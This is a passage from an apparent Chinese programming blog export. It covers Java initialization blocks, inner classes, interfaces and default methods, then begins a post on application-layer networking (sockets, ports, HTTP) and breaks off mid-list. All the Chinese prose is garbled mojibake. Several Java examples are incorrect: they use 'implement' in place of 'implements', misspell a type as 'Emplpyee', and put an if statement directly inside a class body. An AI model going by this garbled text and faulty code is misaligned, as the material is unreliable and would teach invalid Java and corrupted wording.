<p>Java å…è®¸é‡è½½ä»»ä½•æ–¹æ³•ï¼Œè€Œä¸ä»…ä»…æ˜¯æ„é€ å™¨æ–¹æ³•ã€‚å› æ­¤ï¼Œè¦å®Œæ•´åœ°è¡¨è¿°ä¸€ä¸ªæ–¹æ³•ï¼Œéœ€è¦æŒ‡å‡ºæ–¹æ³•åä»¥åŠå‚æ•°ç±»å‹ã€‚è¿™å«åšæ–¹æ³•çš„<strong>ç­¾åï¼ˆsignatureï¼‰</strong>ã€‚</p>
<h2 id="å¯¹è±¡åˆå§‹åŒ–å—"><a href="#å¯¹è±¡åˆå§‹åŒ–å—" class="headerlink" title="å¯¹è±¡åˆå§‹åŒ–å—"></a>å¯¹è±¡åˆå§‹åŒ–å—</h2><p>åœ¨ä¸€ä¸ªç±»çš„å£°æ˜ä¸­ï¼Œå¯ä»¥åŒ…å«å¤šä¸ªä»£ç å—ã€‚åªè¦æ„é€ ç±»çš„å¯¹è±¡ï¼Œè¿™äº›å—å°±ä¼šè¢«æ‰§è¡Œï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> nextId = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> salary;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–åŸŸ</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.id = nextId;</span><br><span class="line">        nextId++;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ— è®ºä½¿ç”¨å“ªä¸ªæ„é€ å™¨æ„é€ å¯¹è±¡ï¼ŒidåŸŸéƒ½åœ¨å¯¹è±¡åˆå§‹åŒ–å—ä¸­è¢«åˆå§‹åŒ–ã€‚<strong>é¦–å…ˆè¿è¡Œåˆå§‹åŒ–å—ï¼Œç„¶åæ‰è¿è¡Œæ„é€ å™¨ã€‚</strong></p>
<p><strong>ä¸‹é¢æ˜¯æ„é€ ä¸€ä¸ªå¯¹è±¡çš„å…·ä½“æ­¥éª¤ï¼š</strong></p>
<ol>
<li>æ‰€æœ‰æ•°æ®åŸŸåˆå§‹åŒ–ä¸ºé»˜è®¤å€¼ï¼ˆ0ï¼Œfalseï¼Œnullï¼‰</li>
<li>æŒ‰ç…§åœ¨ç±»å£°æ˜ä¸­å‡ºç°çš„æ¬¡åºï¼Œä¾æ¬¡æ‰§è¡Œæ‰€æœ‰çš„åˆå§‹åŒ–è¯­å¥å’Œåˆå§‹åŒ–å—</li>
<li>å¦‚æœæ„é€ å™¨ç¬¬ä¸€è¡Œè°ƒç”¨äº†ç¬¬äºŒä¸ªæ„é€ å™¨ï¼Œåˆ™æ‰§è¡Œç¬¬äºŒä¸ªæ„é€ å™¨ä¸»ä½“</li>
<li>æ‰§è¡Œæ„é€ å™¨ä¸»ä½“</li>
</ol>
<h2 id="å†…éƒ¨ç±»"><a href="#å†…éƒ¨ç±»" class="headerlink" title="å†…éƒ¨ç±»"></a>å†…éƒ¨ç±»</h2><p>åœ¨ä¸€ä¸ªç±»çš„å†…éƒ¨è¿˜å¯ä»¥å®šä¹‰å†…éƒ¨ç±»ï¼Œå†…éƒ¨ç±»åˆåˆ†ä¸ºé™æ€å†…éƒ¨ç±»å’Œéé™æ€å†…éƒ¨ç±»ï¼š</p>
<h3 id="éé™æ€å†…éƒ¨ç±»"><a href="#éé™æ€å†…éƒ¨ç±»" class="headerlink" title="éé™æ€å†…éƒ¨ç±»"></a>éé™æ€å†…éƒ¨ç±»</h3><p>éé™æ€å†…éƒ¨ç±»å¯ä»¥è®¿é—®å¤–éƒ¨ç±»çš„ç§æœ‰å±æ€§ã€‚éé™æ€å†…éƒ¨ç±»å®ä¾‹å¿…é¡»ä¾èµ–äºå¤–éƒ¨ç±»å®ä¾‹è€Œå­˜åœ¨ï¼Œè¯­æ³•ä¸ºï¼š<code>new outerclass().new innerclass()</code>ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkList</span>&lt;<span class="title">Item</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Node first;</span><br><span class="line">    <span class="keyword">private</span> Node last;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Node next;</span><br><span class="line">        <span class="keyword">private</span> Item item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Item item)</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…³é”®å­—<code>static</code>ä¿®é¥°çš„å†…éƒ¨ç±»ä¸ºé™æ€å†…éƒ¨ç±»ï¼Œå¯ä»¥æ²¡æœ‰å¤–éƒ¨ç±»å®ä¾‹ã€‚è¯­æ³•ä¸ºï¼›<code>new outerclass.innerclass()</code>ã€‚é™æ€å†…éƒ¨ç±»ä¸å¯ä»¥è®¿é—®å¤–éƒ¨ç±»çš„ç§æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œå¯ä»¥è®¿é—®å¤–éƒ¨ç±»ç§æœ‰é™æ€æˆå‘˜:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hero</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hp;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">BattleWin</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ˜æ–—èƒœåˆ©ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">BreakTower</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hp = <span class="number">50000</span>;</span><br><span class="line">        <span class="keyword">if</span> (hp &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            Hero.BattleWin();</span><br><span class="line">            <span class="comment">// é™æ€å†…éƒ¨ç±»æ— æ³•è®¿é—®å¤–éƒ¨ç±»å®ä¾‹å±æ€§ã€‚æ–¹æ³•</span></span><br><span class="line">            System.out.println(name + <span class="string">&quot;èƒœåˆ©ï¼&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ç±»ä¹‹é—´çš„å…³ç³»"><a href="#ç±»ä¹‹é—´çš„å…³ç³»" class="headerlink" title="ç±»ä¹‹é—´çš„å…³ç³»"></a>ç±»ä¹‹é—´çš„å…³ç³»</h2><p>æœ€å¸¸è§çš„å…³ç³»æœ‰ï¼š</p>
<ul>
<li>ä¾èµ–(deependence)ã€‚å¦‚æœä¸€ä¸ªç±»çš„æ–¹æ³•æ“çºµå¦ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼Œæˆ‘ä»¬å°±è¯´ä¸€ä¸ªç±»ä¾èµ–äºå¦ä¸€ä¸ªç±»ã€‚åº”å°½å¯èƒ½å‡å°‘å°†ç›¸äº’ä¾èµ–çš„ç±»ï¼Œå¦‚æœç±»Aä¸ä¾èµ–äºBï¼Œé‚£ä¹ˆBçš„ä»»ä½•æ”¹å˜å¯¹Aæ²¡æœ‰å½±å“ã€‚è¿™ç§°ä¸º<code>è®©ç±»ä¹‹é—´çš„è€¦åˆåº¦æœ€å°</code></li>
<li>èšåˆ(aggregation)ã€‚æ„å‘³ç€ä¸€ä¸ªç±»çš„å¯¹è±¡åŒ…å«å¦ä¸€ä¸ªç±»çš„å¯¹è±¡ã€‚å¦‚è®¢å•ç±»å¯¹è±¡åŒ…å«å•†å“ç±»å¯¹è±¡</li>
<li>ç»§æ‰¿(inheritance)ã€‚ç»§æ‰¿æ˜¯å¯¹è±¡çš„ä¸€ç§æ‰©å±•ï¼Œå­ç±»æ‹¥æœ‰çˆ¶ç±»çš„å…¨éƒ¨æ–¹æ³•å’Œå±æ€§</li>
</ul>
<p>Object ç±»æ˜¯ Java ä¸­æ‰€æœ‰ç±»çš„å§‹ç¥–ï¼ŒJava ä¸­æ¯ä¸ªç±»éƒ½æ˜¯ç”±å®ƒæ‰©å±•è€Œæ¥çš„ã€‚å¦‚æœæ²¡æœ‰æ˜ç¡®æŒ‡å‡ºè¶…ç±»ï¼ŒObject ç±»å°±æ˜¯è¿™ä¸ªç±»çš„è¶…ç±»ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨Objectç±»å‹çš„å˜é‡å¼•ç”¨ä»»ä½•ç±»å‹çš„å˜é‡ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Employee(<span class="string">&quot;David&quot;</span>, <span class="number">4500</span>);</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡ï¼ŒObjectç±»å‹å˜é‡åªæ˜¯å„ç§å€¼çš„æŒæœ‰è€…ï¼Œæƒ³è¦å¯¹å…¶ä¸­çš„å†…å®¹è¿›è¡Œæ“ä½œéœ€è¦è¿›è¡Œç±»å‹è½¬æ¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Employee e = (Employee) obj;</span><br></pre></td></tr></table></figure>

<p>æ‰€æœ‰æ•°ç»„ï¼Œä¸ç®¡æ˜¯åŸºæœ¬ç±»å‹æ•°ç»„è¿˜æ˜¯å¯¹è±¡æ•°ç»„ï¼Œéƒ½æ‰©å±•äº†Objectç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj;</span><br><span class="line">Emplpyee[] staff = <span class="keyword">new</span> Employee[<span class="number">3</span>];</span><br><span class="line">obj = staff; <span class="comment">// OK</span></span><br><span class="line">obj = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>]; <span class="comment">// OK</span></span><br></pre></td></tr></table></figure>

<h2 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h2><p>æ¥å£ï¼ˆinterfaceï¼‰ä¸»è¦ç”¨æ¥æè¿°ç±»å…·æœ‰ä»€ä¹ˆåŠŸèƒ½ï¼Œè€Œä¸ç»™å‡ºæ¯ä¸ªåŠŸèƒ½çš„å…·ä½“å®ç°ã€‚è¿™ç§åšæ³•æœ‰åˆ©äºå®ç°ç±»çš„æ‰©å±•ï¼Œå› ä¸ºJavaä¸æ”¯æŒå¤šç»§æ‰¿ã€‚æ¥å£è¿˜åœ¨æœ‰åˆ©äºå¤šæ€ï¼Œå› ä¸ºè™½ç„¶æ¥å£æ— æ³•æ„é€ å¯¹è±¡ï¼Œå´èƒ½å£°æ˜æ¥å£çš„å˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡èƒ½å¼•ç”¨æ‰€æœ‰å®ç°äº†è¯¥æ¥å£çš„ç±»å¯¹è±¡ã€‚</p>
<p>æ„é€ æ¥å£ä¸æ„é€ ç±»ç›¸ä¼¼ï¼Œåªæ˜¯å°†<code>class</code>æ”¹ä¸º<code>interface</code>ï¼Œæ­¤å¤–ï¼Œè¿˜å¯ä»¥å°†æ¥å£å®šä¹‰ä¸ºæ³›å‹ï¼Œæ¥å—ç±»å‹å‚æ•°ï¼Œè¿™æ ·ä¼šæé«˜æ¥å£çš„å¯ç”¨æ€§ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Compareable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Object other)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Compareable</span>&lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(T other)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥å£å†…å£°æ˜äº†ä¸€äº›æ–¹æ³•ï¼Œç»ä¸åº”å«æœ‰å®ä¾‹åŸŸï¼Œè€Œå®ç°æ–¹æ³•å’Œæä¾›å®ä¾‹åŸŸçš„ä»»åŠ¡éƒ½ç”±å®ç°æ¥å£çš„é‚£ä¸ªç±»å®Œæˆã€‚æ¥å£ä¸­çš„æ–¹æ³•è‡ªåŠ¨æ˜¯<code>public</code>ï¼Œåœ¨ç±»ä¸­å®šä¹‰è¿™äº›æ–¹æ³•æ—¶ä¹Ÿåº”ä½¿ç”¨<code>public</code></p>
<p>ä¸ºäº†è®©ç±»å®ç°æ¥å£ï¼Œæœ‰ä¸¤ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li>è®©ç±»å£°æ˜ä¸ºå®ç°ç»™å®šçš„æ¥å£</li>
<li>å¯¹æ¥å£ä¸­æ‰€æœ‰æ–¹æ³•è¿›è¡Œå®šä¹‰</li>
</ol>
<p>å°†ç±»å£°æ˜ä¸ºå®ç°æŸäº›æ¥å£ï¼Œä½¿ç”¨å…³é”®å­—<code>implement</code>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="title">implement</span> <span class="title">Compareable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Object otherObject)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Employee other = (Employee) otherObject;</span><br><span class="line">        <span class="keyword">return</span> Double.compare(salary, other.salary);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="title">implement</span> <span class="title">Compareable</span>&lt;<span class="title">Employee</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Employee other)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Double.compare(salary, other.salary);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥å£ä¹Ÿå¯ä»¥ç»§æ‰¿ï¼Œå­æ¥å£æœ‰çˆ¶æ¥å£ä¸­å£°æ˜çš„æ–¹æ³•å’Œå¸¸é‡ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Moveable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">time</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">runable</span> <span class="keyword">extends</span> <span class="title">Moveable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">speed</span><span class="params">()</span></span>; <span class="comment">// å®ç°runableçš„ç±»å¿…é¡»å®ç°time()å’Œspeed()æ–¹æ³•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨<code>default</code>å…³é”®å­—å¯ä»¥åœ¨æ¥å£ä¸­å£°æ˜æ–¹æ³•æ—¶è¿›è¡Œç®€å•çš„å®šä¹‰ï¼Œä½†ä¸èƒ½æ¶‰åŠå®ä¾‹åŸŸå› ä¸ºæ¥å£æ²¡æœ‰å®ä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MouseListener</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">mouseClcked</span><span class="params">(MouseEvent event)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;é¼ æ ‡ç‚¹å‡»&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æ­¤ä¸€æ¥ï¼Œå®ç°è¿™ä¸ªæ¥å£çš„ç±»å¯ä»¥ä¸è¦†ç›–è¿™ä¸ªé»˜è®¤æ–¹æ³•è€Œå…·æœ‰é»˜è®¤æ–¹æ³•æä¾›çš„åŠŸèƒ½ã€‚</p>
<p>å¦‚æœæ¥å£çš„é»˜è®¤æ–¹æ³•åä¸è¶…ç±»çš„æ–¹æ³•åå†²çªäº†ï¼Œéµå¾ª<code>è¶…ç±»ä¼˜å…ˆ</code>åŸåˆ™ï¼Œå³æ¥å£æä¾›çš„é»˜è®¤æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚å¦‚æœå¤šä¸ªæ¥å£æä¾›çš„é»˜è®¤æ–¹æ³•åå†²çªï¼Œç”±ç±»å†³å®šä½¿ç”¨å“ªä¸ªæ¥å£çš„é»˜è®¤æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Personå’ŒNamedéƒ½æœ‰é»˜è®¤æ–¹æ³•getName()</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="title">implement</span> <span class="title">Person</span>, <span class="title">Named</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Person.<span class="keyword">super</span>.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘ç»œé‚£äº›äº‹ä¹‹åº”ç”¨å±‚</title>
    <url>/2018/06/07/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%BA%94%E7%94%A8%E5%B1%82/</url>
    <content><![CDATA[<h2 id="ç½‘ç»œåº”ç”¨ç»“æ„"><a href="#ç½‘ç»œåº”ç”¨ç»“æ„" class="headerlink" title="ç½‘ç»œåº”ç”¨ç»“æ„"></a>ç½‘ç»œåº”ç”¨ç»“æ„</h2><ul>
<li>å®¢æˆ·æœº/æœåŠ¡å™¨ç»“æ„ï¼ˆC/Sï¼‰</li>
<li>ç‚¹å¯¹ç‚¹ç»“æ„ï¼ˆP2Pï¼‰</li>
<li>æ··åˆç»“æ„ï¼ˆç»¼åˆ C/S ä¸ P2Pï¼‰</li>
</ul>
<p>åº”ç”¨å±‚æ˜¯ç¨‹åºå‘˜æœ€å¸¸æ¥è§¦çš„å±‚æ¬¡ï¼Œåº”å½“éå¸¸ç†Ÿæ‚‰ã€‚</p>
<h2 id="ç«¯ç³»ç»Ÿé—´çš„è¿›ç¨‹é€šä¿¡"><a href="#ç«¯ç³»ç»Ÿé—´çš„è¿›ç¨‹é€šä¿¡" class="headerlink" title="ç«¯ç³»ç»Ÿé—´çš„è¿›ç¨‹é€šä¿¡"></a>ç«¯ç³»ç»Ÿé—´çš„è¿›ç¨‹é€šä¿¡</h2><p>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥ç†è§£ä¸ºè¿è¡Œåœ¨ç«¯ç³»ç»Ÿä¸­çš„çš„ä¸€ä¸ªç¨‹åºã€‚å½“è¿›ç¨‹è¿è¡Œåœ¨ç›¸åŒçš„ç«¯ç³»ç»Ÿä¸Šæ—¶ï¼Œå®ƒä»¬ä½¿ç”¨è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ç›¸äº’é€šä¿¡ã€‚è€Œåœ¨ä¸åŒçš„ç«¯ç³»ç»Ÿä¸Šï¼Œé€šè¿‡è·¨è¶Šè®¡ç®—æœºç½‘ç»œäº¤æ¢<code>æŠ¥æ–‡</code>å®ç°è¿›ç¨‹é—´çš„é€šä¿¡ã€‚</p>
<p>å¤šæ•°åº”ç”¨ç¨‹åºç”±é€šä¿¡è¿›ç¨‹å¯¹ç»„æˆï¼Œæ¯å¯¹ä¸­çš„ä¸¤ä¸ªè¿›ç¨‹äº’ç›¸å‘é€æŠ¥æ–‡ï¼Œä»ä¸€ä¸ªè¿›ç¨‹å‘å¦ä¸€ä¸ªè¿›ç¨‹å‘é€æŠ¥æ–‡å°±å¿…é¡»ç»è¿‡ä¸‹é¢çš„è®¡ç®—æœºç½‘ç»œã€‚è¿›ç¨‹é€šè¿‡ä¸€ä¸ªè¢«ç§°ä¸º<code>å¥—æ¥å­—</code>çš„è½¯ä»¶æ¥å£å‘ç½‘ç»œå‘é€æŠ¥æ–‡å’Œæ¥å—æŠ¥æ–‡ã€‚<code>å¥—æ¥å­—</code>ç±»ä¼¼äºä¸€æ ‹å±‹å­çš„é—¨ï¼Œæ— è®ºæ˜¯è¦è¿›å…¥å±‹å­è¿˜æ˜¯ç¦»å¼€å±‹å­ï¼Œéƒ½è¦è¿›è¿‡é—¨ã€‚<code>å¥—æ¥å­—</code>æ˜¯åº”ç”¨å±‚ä¸è¿è¾“å±‚çš„æ¥å£ã€‚åœ¨è¿è¾“å±‚ï¼Œå¼€å‘è€…å¯¹äº<code>å¥—æ¥å­—</code>å‡ ä¹æ²¡æœ‰æ§åˆ¶æƒï¼Œåªèƒ½</p>
<ol>
<li>é€‰æ‹©è¿è¾“å±‚åè®®</li>
<li>è®¾å®šå‡ ä¸ªå‚æ•°ï¼Œå¦‚æœ€å¤§ç¼“å­˜ã€æœ€å¤§æŠ¥æ–‡æ®µé•¿åº¦ç­‰</li>
</ol>
<h3 id="å¥—æ¥å­—ï¼ˆSocketï¼‰"><a href="#å¥—æ¥å­—ï¼ˆSocketï¼‰" class="headerlink" title="å¥—æ¥å­—ï¼ˆSocketï¼‰"></a>å¥—æ¥å­—ï¼ˆSocketï¼‰</h3><p>å¥—æ¥å­—æ˜¯ä¸€ç§åº”ç”¨ç¼–ç¨‹æ¥å£ï¼ˆAPIï¼‰ï¼Œä¸åŒä¸»æœºçš„åº”ç”¨è¿›ç¨‹é—´é€šä¿¡çš„æŠ½è±¡æœºåˆ¶ã€‚åº”ç”¨è¿›ç¨‹é€šè¿‡å¥—æ¥å­—å°†æ•°æ®æ§åˆ¶æƒè½¬ç§»ç»™æ“ä½œç³»ç»Ÿï¼Œä»¥å®ç°ä¿¡æ¯ä»åº”ç”¨å±‚åˆ°ä¼ è¾“å±‚çš„è½¬æ¢ã€‚</p>
<h3 id="ç«¯å£å·"><a href="#ç«¯å£å·" class="headerlink" title="ç«¯å£å·"></a>ç«¯å£å·</h3><p>æ¯ä¸ªåº”ç”¨è¿›ç¨‹éƒ½å¯èƒ½å¯¹åº”ä¸€ä¸ªæˆ–å¤šä¸ªå¥—æ¥å­—ã€‚ä¸ºäº†åŒºåˆ†ä¸åŒå¥—æ¥å­—ï¼Œæ“ä½œç³»ç»Ÿç»™æ¯ä¸ªå¥—æ¥å­—ç»‘å®šä¸€ä¸ª 16 ä½æ•´æ•°ï¼ˆ0â€”â€”65535ï¼‰ï¼Œç§°ä¹‹ä¸º<strong>ç«¯å£å·ï¼ˆportï¼‰</strong>ã€‚</p>
<p>å¯¹å¤–æ ‡è¯†é€šä¿¡ç«¯ç‚¹ï¼šIP Address + portã€‚</p>
<h3 id="è¿›ç¨‹å¯»å€"><a href="#è¿›ç¨‹å¯»å€" class="headerlink" title="è¿›ç¨‹å¯»å€"></a>è¿›ç¨‹å¯»å€</h3><p>ä¸ºäº†ä¸å¦ä¸€ä¸ªç«¯ç³»ç»Ÿé€šä¿¡ï¼Œå¿…é¡»çŸ¥é“ï¼š</p>
<ol>
<li>å¦ä¸€ç«¯ç³»ç»Ÿçš„åœ°å€</li>
<li>å®šä¹‰åœ¨ç›®çš„ç«¯ç³»ç»Ÿä¸­çš„æ¥æ”¶è¿›ç¨‹çš„æ ‡å¿—ç¬¦</li>
</ol>
<p>ç«¯ç³»ç»Ÿåœ°å€ç”±<code>IPåœ°å€</code>ç¡®å®šï¼Œè€Œæ¥æ”¶è¿›ç¨‹æ ‡å¿—ç¬¦ç”±<code>ç«¯å£</code>ç¡®å®šã€‚</p>
<p>æ“ä½œç³»ç»Ÿå¯¹å†…æ ‡è¯†å¥—æ¥å­—ï¼š<strong>å¥—æ¥å­—æè¿°ç¬¦ï¼ˆsocket descriptorï¼‰</strong>ï¼Œéå¸¸ç±»ä¼¼äºæ–‡ä»¶çš„æŠ½è±¡æœºåˆ¶ã€‚æ¯ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªå¥—æ¥å­—æè¿°ç¬¦è¡¨ï¼Œè¿›ç¨‹æ¯åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—éƒ½ä¼šåœ¨è¡¨é‡Œå¢åŠ ä¸€ä¸ªæ¡ç›®ï¼Œæ¯ä¸ªæ¡ç›®å¯¹åº”ä¸€ä¸ªå¥—æ¥å­—æ•°æ®ç»“æ„æŒ‡é’ˆã€‚</p>
<p><img src="https://i.loli.net/2019/12/21/LEHvFzdNowkq6Bc.png" alt="å¥—æ¥å­—æè¿°ç¬¦è¡¨"></p>
<p>åœ°å€æ—ï¼ˆfamilyï¼‰ï¼šä¸åŒä¼ è¾“åè®®ä¸‹ä¸»æœºçš„ç«¯ç‚¹å½¢å¼ä¸åŒï¼Œç”¨åœ°å€æ—åŒºåˆ†ä¸åŒçš„ä¼ è¾“åè®®ã€‚</p>
<p>ç±»å‹ï¼ˆserviceï¼‰ï¼šåŒºåˆ†æŸä¸€ä¼ è¾“åè®®ä¸‹çš„ä¸åŒåè®®ã€‚</p>
<p><img src="https://i.loli.net/2019/12/21/4vTABxRFnmIgh9Q.png" alt="åè®®ç±»å‹"></p>
<h2 id="å‡ ç§å¸¸è§çš„åº”ç”¨å±‚åè®®"><a href="#å‡ ç§å¸¸è§çš„åº”ç”¨å±‚åè®®" class="headerlink" title="å‡ ç§å¸¸è§çš„åº”ç”¨å±‚åè®®"></a>å‡ ç§å¸¸è§çš„åº”ç”¨å±‚åè®®</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTPï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰æ˜¯ Web çš„æ ¸å¿ƒã€‚åœ¨ Web åº”ç”¨ä¸­ï¼Œå®¢æˆ·ä¸æœåŠ¡å™¨ä¹‹é—´æ˜¯é€šè¿‡ HTTP æŠ¥æ–‡è¿›è¡Œä¼šè¯çš„ã€‚è€ŒHTTPåè®®å®šä¹‰äº†æŠ¥æ–‡æ ¼å¼ä¸äº¤æ¢æ–¹å¼ã€‚Web æœåŠ¡å™¨å®ç°äº† HTTP çš„æœåŠ¡å™¨ç«¯ï¼Œç”¨äºå­˜å‚¨ Web å¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡ç”± url å¯»å€ã€‚</p>
<p><img src="https://i.loli.net/2020/01/20/9MTnkYv5yfxOL1u.png" alt="HTTPè¯·æ±‚æ ¼å¼"></p>
<p><img src="https://i.loli.net/2020/01/20/StgFZXMs5GIbwYc.png" alt="HTTPå“åº”æ ¼å¼"></p>
<p>HTTP ä½¿ç”¨<code>TCP</code>ä½œä¸ºå®ƒçš„æ”¯æ’‘è¿è¾“åè®®ï¼Œé»˜è®¤é‡‡ç”¨<code>å¸¦æµæ°´æœºåˆ¶çš„æŒä¹…æ€§è¿æ¥</code>ã€‚ ä¸€æ¬¡å®Œæ•´çš„<code>è¯·æ±‚â€”â€”å“åº”</code>æµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p>
<ol>
<li>HTTPå®¢æˆ·ç«¯é¦–å…ˆå‘èµ·ä¸€ä¸ªä¸æœåŠ¡å™¨çš„ TCP è¿æ¥ï¼Œä¸€æ—¦è¿æ¥å»ºç«‹ï¼Œè¯¥å®¢æˆ·ç«¯è¿›ç¨‹ä¸æœåŠ¡å™¨è¿›ç¨‹å°±å¯ä»¥é€šè¿‡å¥—æ¥å­—æ¥å£é€šä¿¡ã€‚</li>
<li>å®¢æˆ·ç«¯å‘å®ƒçš„<code>å¥—æ¥å­—</code>æ¥å£å‘é€ HTTP è¯·æ±‚æŠ¥æ–‡ã€‚</li>
